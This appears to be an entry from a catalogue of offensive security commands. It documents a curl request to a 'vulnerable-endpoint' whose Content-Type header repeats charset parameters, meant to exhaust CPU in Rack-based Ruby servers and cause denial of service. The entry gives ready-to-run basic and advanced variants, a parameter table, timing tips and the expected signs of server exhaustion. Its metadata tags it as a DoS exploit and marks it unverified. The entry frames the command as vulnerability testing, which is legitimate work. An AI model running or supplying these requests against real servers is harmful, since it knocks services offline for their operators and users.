---
id: cmd-uuid-001
data: >-
  curl -X POST http://target-app.com/vulnerable-endpoint -H "Content-Type:
  text/plain; charset=utf-8; charset=utf-8; charset=utf-8; charset=utf-8" -d
  "dummy payload"
name: curl-send-crafted-header
tags:
  - dos
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.722Z'
verified: false
validated: true
submitted: true
---
# curl-send-crafted-header

## Command

```bash
curl -X POST http://target-app.com/vulnerable-endpoint \
  -H "Content-Type: text/plain; charset=utf-8; charset=utf-8; charset=utf-8; charset=utf-8" \
  -d "dummy payload"
```

## Description

This command uses curl to send an HTTP POST request to a target endpoint with a specially crafted Content-Type header designed to exploit parsing inefficiencies in Rack, causing CPU exhaustion and denial of service. It is used in web vulnerability testing to demonstrate resource consumption attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target-app.com/vulnerable-endpoint` | The target URL endpoint | Yes |
| `-H "Content-Type: ..."` | Custom header with repeated parameters to trigger inefficient parsing | Yes |
| `-d "dummy payload"` | Request body data (minimal payload to invoke parsing) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://example.com/api/upload \
  -H "Content-Type: text/plain; charset=utf-8; charset=utf-8" \
  -d "test"
```

### Advanced Usage

```bash
curl -X POST http://target.com/endpoint \
  -H "Content-Type: application/json; charset=utf-8; charset=iso-8859-1; charset=utf-8" \
  -H "User-Agent: Mozilla/5.0" \
  -d "{}"
```

Add timing with `-w "%{time_total}s\n"` to measure response delays.

## Expected Output

Successful execution may result in a delayed HTTP response (e.g., 200 OK after several seconds) or timeout, with no body if the server hangs. Errors like connection reset indicate severe exhaustion. Server-side: High CPU in Ruby/Rack processes.

## Related

- [[Related Procedure|procedures/Exploit-Rack-Content-Type-DoS]]
